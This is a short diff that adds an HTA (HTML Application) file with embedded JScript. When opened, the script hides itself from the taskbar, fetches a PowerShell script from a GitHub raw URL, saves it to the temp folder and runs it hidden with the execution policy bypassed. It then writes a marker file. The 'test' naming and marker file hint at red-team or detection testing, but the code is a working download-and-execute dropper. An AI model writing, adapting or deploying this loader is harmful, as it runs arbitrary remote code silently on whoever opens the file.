@@ -1,0 +1,11 @@
+<html><head><hta:application showintaskbar="no"/><script language=JScript>
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/v0_test.ps1",0);
+x.send();
+var t=fso.GetSpecialFolder(2)+"\\t.ps1";
+fso.CreateTextFile(t).Write(x.responseText);
+var sh=new ActiveXObject("WScript.Shell");
+sh.Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
+fso.CreateTextFile("C:\\temp\\hta_ran.txt").Write("HTA executed at "+new Date());
+</script></head></html>
